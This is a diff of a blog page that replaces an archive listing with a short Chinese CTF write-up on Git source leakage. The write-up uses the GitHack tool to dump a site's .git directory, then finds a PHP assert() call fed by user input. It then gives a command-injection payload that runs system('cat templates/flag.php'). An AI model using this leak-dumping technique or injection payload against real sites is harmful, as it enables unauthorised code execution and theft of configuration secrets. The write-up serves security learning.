@@ -8,10 +8,10 @@
   <meta name="description" content>
   <meta name="author" content="gelinlang">
   <!-- Open Graph Data -->
-  <meta property="og:title" content="gelinlang&#39;s Blog">
+  <meta property="og:title" content="Git源码泄露">
   <meta property="og:description" content="路漫漫求修远兮，我将上下而求索">
   <meta property="og:site_name" content="gelinlang&#39;s Blog">
-  <meta property="og:type" content="website">
+  <meta property="og:type" content="article">
   <meta property="og:image" content="http://gelinlang.cn">
   
     <link rel="alternate" href="/atom.xml" title="gelinlang&#39;s Blog" type="application/atom+xml">
@@ -35,8 +35,7 @@
 </head>
 
   <body>
-    <!-- Archive Header -->
-<!-- Page Header -->
+    <!-- Page Header -->
 
 
 <header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
@@ -44,7 +43,7 @@
     <div class="row">
       <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
         <div class="page-title with-background-image">
-          <p class="title">Blog Archives</p>
+          <p class="title">Git源码泄露</p>
           <p class="subtitle"></p>
         </div>
         <div class="site-menu with-background-image">
@@ -97,81 +96,42 @@
   </div>
 </header>
 
-<!-- Archive List -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/偶然在教务处发现csrf漏洞/" class="post-title">
-    偶然在教务处发现csrf漏洞
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By gelinlang</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-04-23</span>
+            <span class="time">22:04:14</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
 
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/记某网站验证不严导致密码泄露及任意账户重置漏洞/" class="post-title">
-    记某网站验证不严导致密码泄露及任意账户重置漏洞
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
+<a href="/categories/随笔/">随笔</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>Git信息泄露的危害很大，可直接从源码获取敏感配置信息（如：邮箱，数据库），也可以进一步审计代码，挖掘文件上传、SQL注射等安全漏洞。缺陷编号：wooyun-2015-0117332。</p>
+<p><strong>获取利用代码：</strong><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a><br><a id="more"></a><br>实例：一道web题，My PHP Website。页面就就三个，home，about，contact。F12看源码，提示有个flag页面，访问是空的。其中在about中显示了使用了git，于是看下能不能导出源码来分析。<br>使用 python GitHack.py IP/.git<br>可以看到index源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123; </span><br><span class="line">$page = $_GET[&apos;page&apos;]; &#125; </span><br><span class="line">else &#123; </span><br><span class="line">$page = &quot;home&quot;; </span><br><span class="line">&#125; </span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;; </span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;); </span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>对file没有处理，直接构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;) or system(&apos;cat templates/flag.php&apos;);//</span><br></pre></td></tr></table></figure></p>
+<p>意思是先将strpos函数闭合，然后调用系统命令查看template目录下的flag.php，再把后面注释掉 。<br>访问后得到flag</p>
 
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/反序列化中__wakeup()函数漏洞/" class="post-title">
-    反序列化中__wakeup()函数漏洞
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
-
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/Web-wanna-to-see-your-hat-/" class="post-title">
-    Web-wanna-to-see-your-hat
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
-
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/src业务逻辑思路/" class="post-title">
-    src业务逻辑思路
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
-
-      
-        <div class="archive-item">
-  <a href="/2019/04/23/SQLite的注入/" class="post-title">
-    SQLite的注入
-  </a>
-  <div class="date text-muted">Posted on 2019-04-23 21:51:55</div>
-</div>
-
-      
-
+        </div>
+      </div>
     </div>
   </div>
-</div>
-<!-- Pagination -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-10 col-md-10 col-md-offset-1">
-      <ul class="pagination">
-          
-          
-            <li class="next">
-              <a href="/archives/2019/04/page/2/">
-                <span>NEXT</span>
-                <span class="symbol-right">&gt;</span>
-              </a>
-            </li>
-          
-      </ul>
-    </div>
-  </div>
-</div>
+</article>
 
 
 
